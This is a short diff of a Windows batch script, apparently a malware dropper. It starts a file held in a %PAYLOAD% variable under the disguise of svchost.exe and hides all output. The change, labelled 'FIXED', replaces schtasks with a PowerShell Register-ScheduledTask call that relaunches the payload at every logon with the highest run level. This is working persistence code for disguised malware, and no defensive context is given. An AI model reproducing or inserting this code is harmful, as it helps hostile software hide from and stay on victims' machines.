@@ -55,8 +55,12 @@ if exist "%PAYLOAD%" (
     taskkill /f /im "svchost.exe" /fi "Path eq %PAYLOAD%" >nul 2>&1
     start "" "%PAYLOAD%" >nul 2>&1
     
-    schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
-    schtasks /create /tn "%TASK_NAME%" /tr "\"%PAYLOAD%\"" /sc onlogon /ru "%USERNAME%" /rl HIGHEST /f /it >nul 2>&1
+    :: FIXED: PowerShell task creation (bypasses schtasks issues completely)
+    powershell -Command ^
+        "$action = New-ScheduledTaskAction -Execute '%PAYLOAD%'; " ^
+        "$trigger = New-ScheduledTaskTrigger -AtLogOn; " ^
+        "$principal = New-ScheduledTaskPrincipal -UserId (Get-CimInstance -ClassName Win32_ComputerSystem).UserName -LogonType Interactive -RunLevel Highest; " ^
+        "Register-ScheduledTask -TaskName '%TASK_NAME%' -Action $action -Trigger $trigger -Principal $principal -Force" >nul 2>&1
 )
 
 echo.
